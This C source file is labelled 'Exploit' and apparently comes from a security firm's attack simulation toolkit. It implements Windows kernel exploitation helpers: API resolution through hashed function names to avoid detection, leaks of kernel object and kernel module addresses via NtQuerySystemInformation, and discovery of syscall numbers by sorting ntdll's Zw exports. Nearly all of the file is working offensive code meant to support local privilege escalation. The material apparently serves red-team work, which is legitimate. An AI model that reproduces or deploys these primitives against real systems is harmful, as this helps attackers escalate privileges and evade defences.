/*!
 *
 * Exploit
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation
 *
!*/

#include "Common.h"

typedef struct
{
	ULONG Hash;
	PVOID Addr;
} SYSCALL_LIST_ENTRY, *PSYSCALL_LIST_ENTRY;

typedef struct
{
	ULONG Count;
	SYSCALL_LIST_ENTRY Entry[ 0 ];
} SYSCALL_LIST, *PSYSCALL_LIST;

typedef struct
{
	D_API( NtQuerySystemInformation );
	D_API( RtlInitUnicodeString );
	D_API( RtlReAllocateHeap );
	D_API( RtlAllocateHeap );
	D_API( LdrUnloadDll );
	D_API( RtlFreeHeap );
	D_API( LdrLoadDll );
} API ;

typedef struct
{
	PVOID Section;
	PVOID MappedBase;
	PVOID ImageBase;
	ULONG ImageSize;
	ULONG Flags;
	USHORT LoadOrderIndex;
	USHORT InitOrderIndex;
	USHORT LoadCount;
	USHORT OffsetToFileName;
	UCHAR   FullPathName[ MAX_PATH - 4 ];
} SYSTEM_MODULE_ENTRY, *PSYSTEM_MODULE_ENTRY ;

typedef struct
{
	ULONG Count;
	SYSTEM_MODULE_ENTRY Module[ 1 ];
} SYSTEM_MODULE_INFORMATION, *PSYSTEM_MODULE_INFORMATION ;

#define H_API_NTQUERYSYSTEMINFORMATION	0x7bc23928 /* NtQuerySystemInformation */
#define H_API_RTLINITUNICODESTRING	0xef52b589 /* RtlInitUnicodeString */
#define H_API_RTLREALLOCATEHEAP		0xaf740371 /* RtlReAllocateHeap */
#define H_API_RTLALLOCATEHEAP		0x3be94c5a /* RtlAllocateHeap */
#define H_API_LDRUNLOADDLL		0xd995c1e6 /* LdrUnloadDll */
#define H_API_RTLFREEHEAP		0x73a9e4d7 /* RtlFreeHeap */
#define H_API_LDRLOADDLL		0x9e456a43 /* LdrLoadDll */
#define H_LIB_NTOSKRNL			0xa3ad0390 /* ntoskrnl.exe */
#define H_LIB_NTDLL			0x1edab0ed /* ntdll.dll */

/*!
 *
 * Purpose:
 *
 * Searches for an objects kernel address in memory.
 *
!*/
D_SEC( E ) PVOID KernelObjectAddress( _In_ PVOID Handle )
{
	API				Api;

	INT				Idx = 0;
	SIZE_T				Len = 0x1000;
	NTSTATUS			Ret = STATUS_UNSUCCESSFUL;

	PVOID				Obj = NULL;
	PSYSTEM_HANDLE_INFORMATION	Tmp = NULL;
	PSYSTEM_HANDLE_INFORMATION	Shi = NULL;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );

	Api.NtQuerySystemInformation = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYSYSTEMINFORMATION );
	Api.RtlReAllocateHeap        = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLREALLOCATEHEAP );
	Api.RtlAllocateHeap          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.RtlFreeHeap              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );

	Shi = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Len );

	if ( Shi != NULL ) {
		while ( ( Ret = Api.NtQuerySystemInformation( SystemHandleInformation, Shi, Len, NULL ) ) == STATUS_INFO_LENGTH_MISMATCH ) {
			Tmp = Api.RtlReAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Shi, Len = Len + 0x1000 );
			if ( ! Tmp ) {
				break;
			};
			Shi = C_PTR( Tmp );
		};
		if ( NT_SUCCESS( Ret ) && Shi != NULL ) {
			for ( Idx = 0 ; Idx < Shi->NumberOfHandles ; ++Idx ) {
				if ( Shi->Handles[ Idx ].UniqueProcessId == ( ( USHORT ) NtCurrentTeb()->ClientId.UniqueProcess ) ) {
					if ( Shi->Handles[ Idx ].HandleValue == ( ( USHORT ) Handle ) ) {
						Obj = C_PTR( Shi->Handles[ Idx ].Object );
						goto End;
					};
				};
			};
		};
End:
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Shi );
	};
	return Obj;
};

/*!
 *
 * Purpose:
 *
 * Searches for an modules kernel address in memory.
 *
!*/
D_SEC( C ) PVOID KernelModuleAddress( _In_ ULONG HashName )
{
	API				Api;

	SIZE_T				Idx = 0;
	SIZE_T				Len = 0;
	
	PVOID				Mod = NULL;
	PCHAR				Str = NULL;
	PSYSTEM_MODULE_INFORMATION	Smi = NULL;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	Api.NtQuerySystemInformation = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_NTQUERYSYSTEMINFORMATION );
	Api.RtlAllocateHeap          = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.RtlFreeHeap              = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );

	if ( ! NT_SUCCESS( Api.NtQuerySystemInformation( SystemModuleInformation, NULL, 0, &Len ) ) ) {
		Smi = Api.RtlAllocateHeap( NtCurrentPeb()->ProcessHeap, HEAP_ZERO_MEMORY, Len );

		if ( NT_SUCCESS( Api.NtQuerySystemInformation( SystemModuleInformation, Smi, Len, &Len ) ) ) {
			for ( Idx = 0 ; Idx < Smi->Count ; ++Idx ) {
				Str = C_PTR( U_PTR( Smi->Module[ Idx ].FullPathName ) + Smi->Module[ Idx ].OffsetToFileName );

				if ( HashString( Str, 0 ) == HashName ) {
					Mod = Smi->Module[ Idx ].ImageBase;
					goto End;
				};
			};
		};
End:
		Api.RtlFreeHeap( NtCurrentPeb()->ProcessHeap, 0, Smi );
	};
	return Mod;
};

/*!
 *
 * Purpose:
 *
 * Searches for the system call ID of the export.
 *
!*/

D_SEC( C ) ULONG KernelSystemCallNum( _In_ ULONG HashName )
{
	API			Api;
	SYSCALL_LIST_ENTRY	Ent;

	INT			Jdx = 0;
	INT			Idx = 0;
	ULONG			Sid = 0;
	PUINT32			Aon = NULL;
	PUINT32			Aof = NULL;
	PUINT16			Aoo = NULL;
	PSYSCALL_LIST		Tmp = NULL;
	PSYSCALL_LIST		Lst = NULL;
	PIMAGE_DOS_HEADER	Dos = NULL;
	PIMAGE_NT_HEADERS	Nth = NULL;
	PIMAGE_DATA_DIRECTORY	Dir = NULL;
	PIMAGE_EXPORT_DIRECTORY	Exp = NULL;

	RtlSecureZeroMemory( &Api, sizeof( Api ) );
	Api.RtlReAllocateHeap = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLREALLOCATEHEAP );
	Api.RtlAllocateHeap   = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLALLOCATEHEAP );
	Api.RtlFreeHeap       = PeGetFuncEat( PebGetModule( H_LIB_NTDLL ), H_API_RTLFREEHEAP );

	Dos = C_PTR( PebGetModule( H_LIB_NTDLL ) );
	Nth = C_PTR( U_PTR( Dos ) + Dos->e_lfanew );
	Dir = & Nth->OptionalHeader.DataDirectory[ IMAGE_DIRECTORY_ENTRY_EXPORT ];

	if ( Dir->VirtualAddress ) {
		Exp = C_PTR( U_PTR( Dos ) + Dir->VirtualAddress );
		Aon = C_PTR( U_PTR( Dos ) + Exp->AddressOfNames );
		Aof = C_PTR( U_PTR( Dos ) + Exp->AddressOfFunctions );
		Aoo = C_PTR( U_PTR( Dos ) + Exp->AddressOfNameOrdinals );

		Lst = Api.RtlAllocateHeap( NtCurrentPeb( )->ProcessHeap, HEAP_ZERO_MEMORY, sizeof( SYSCALL_LIST ) );

		if ( Lst != NULL ) {
			for ( Idx = 0 ; Idx < Exp->NumberOfNames ; ++Idx ) {
				if ( *( UINT16 * )( C_PTR( U_PTR( Dos ) + Aon[ Idx ] ) ) ==  'wZ' ) {
					Lst->Count = Lst->Count + 1;
					Tmp       = Api.RtlReAllocateHeap( NtCurrentPeb( )->ProcessHeap, HEAP_ZERO_MEMORY, Lst, sizeof( SYSCALL_LIST ) + ( Lst->Count * sizeof( SYSCALL_LIST_ENTRY ) ) );
					if ( Tmp == NULL ) {
						break; 
					};
					Lst = Tmp;
					Lst->Entry[ Lst->Count - 1 ].Hash = HashString( C_PTR( U_PTR( Dos ) + Aon[ Idx ] ), 0 );
					Lst->Entry[ Lst->Count - 1 ].Addr = C_PTR( U_PTR( Dos ) + Aof[ Aoo[ Idx ] ] );
				};
			};
			for ( Idx = 0 ; Idx < Lst->Count - 1 ; ++Idx ) {
				for ( Jdx = 0 ; Jdx < Lst->Count - Idx - 1; ++Jdx ) {
					if ( Lst->Entry[ Jdx ].Addr > Lst->Entry[ Jdx + 1 ].Addr ) {
						Ent.Hash = Lst->Entry[ Jdx ].Hash;
						Ent.Addr = Lst->Entry[ Jdx ].Addr;

						Lst->Entry[ Jdx ].Hash = Lst->Entry[ Jdx + 1 ].Hash;
						Lst->Entry[ Jdx ].Addr = Lst->Entry[ Jdx + 1 ].Addr;

						Lst->Entry[ Jdx + 1 ].Hash = Ent.Hash;
						Lst->Entry[ Jdx + 1 ].Addr = Ent.Addr;
					};
				};
			};
			for ( Idx = 0 ; Idx < Lst->Count ; ++Idx ) {
				if ( HashName == Lst->Entry[ Idx ].Hash ) {
					Sid = Idx;
				};
			};
		};
		Api.RtlFreeHeap( NtCurrentPeb( )->ProcessHeap, 0, Lst );
	};
	return Sid;
};
